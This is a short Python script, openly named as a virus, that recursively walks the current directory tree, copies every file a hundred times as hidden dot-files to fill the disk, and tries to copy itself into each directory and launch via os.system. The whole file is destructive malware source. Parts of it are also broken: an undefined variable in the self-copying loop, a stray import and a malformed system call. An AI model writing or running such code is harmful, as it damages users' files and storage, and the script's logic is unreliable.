from msilib.schema import Directory
import os
import shutil
import random

class virus:
    def __init__(self,path=None,target_dir=None,repeat=None):
        self.path=path
        self.target_dir=[]
        self.repeat=100
        self.own_path=os.path.realpath(__file__)
    
    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir=os.listdir(path)
        for file in current_dir:
            if not file.startswith('.'):
                abosulute_path=os.path.join(path,file)
                print(abosulute_path)
                if os.path.isdir(abosulute_path):
                    self.list_directories(abosulute_path)
                else:
                    pass
                
    def new_virus(self):
        for diroctoery in self.target_dir:
            n=random.randint(0,10)
            new_virus="Virus"+str(n)+".py"
            destination=os.path.join(directory,new_virus)
            shutil.copyfile(self.own_path,destination)
            os.system(new_virus+"1")
    def replicate(self):
        for diroctoery in self.target_dir:
            file_list_in_dir=os.listdir(diroctoery)
            for file in file_list_in_dir:
                abs_path=os.path.join(diroctoery,file)
                if not abs_path.startswith(".")and not os.path.isdir(abs_path):
                    source=abs_path
                    for i in range(self.repeat):
                        destinitaion=os.path.join(diroctoery,("."+file+str(i)))
                        shutil.copyfile(source,destinitaion)
    def virus_action(self):
        self.list_directories(self.path)
        print(self.target_dir)
        self.replicate()
        self.new_virus()

if __name__=="__main__":
    current_direcotry=os.path.abspath("")
    virus=virus(path=current_direcotry)
    virus.virus_action()                
                    
        
                
